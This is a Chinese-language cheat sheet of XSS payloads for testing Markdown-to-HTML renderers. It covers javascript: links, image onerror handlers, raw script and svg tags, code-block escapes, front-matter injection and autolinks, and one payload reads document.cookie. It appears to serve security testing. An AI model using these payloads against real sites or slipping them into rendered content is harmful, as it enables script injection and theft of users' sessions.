````
注：用代码块注释
注：Markdown 渲染器常允许部分 HTML，以下 payload 用于测试 MD → HTML 链路

## 链接语法

```
[click me](javascript:alert('XSS'))
[click](javascript:alert(document.cookie))
[click](data:text/html,<script>alert(1)</script>)
[click](&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1))
```

## 图片语法

```
![](javascript:alert('XSS'))
![](x onerror=alert(1))
![alt](x "onerror=alert(1)")
<img src=x onerror=alert(1)>
```

## 原始 HTML 混入 Markdown

```
# 标题<script>alert(1)</script>

正文 **bold** <img src=x onerror=alert(1)>

> 引用块 <svg/onload=alert(1)>

- 列表项 <script>alert(1)</script>
- [x] 任务 <img src=x onerror=alert(1)>
```

## 代码块逃逸（部分编辑器预览漏洞）

```
```html
<script>alert(1)</script>
```

`` `<script>alert(1)</script>` ``

`<img src=x onerror=alert(1)>`
```

## Front Matter / 元数据注入

```
---
title: "><script>alert(1)</script>
description: <img src=x onerror=alert(1)>
---
```

## 脚注与参考链接

```
[^1]: <script>alert(1)</script>

[ref]: javascript:alert(1)
[link][ref]
```

## Mermaid / 扩展语法（若渲染为 HTML）

```
<script>alert(1)</script>
```

## 自动链接

```
<javascript:alert(1)>
<http://example.com/<script>alert(1)</script>>
```

````
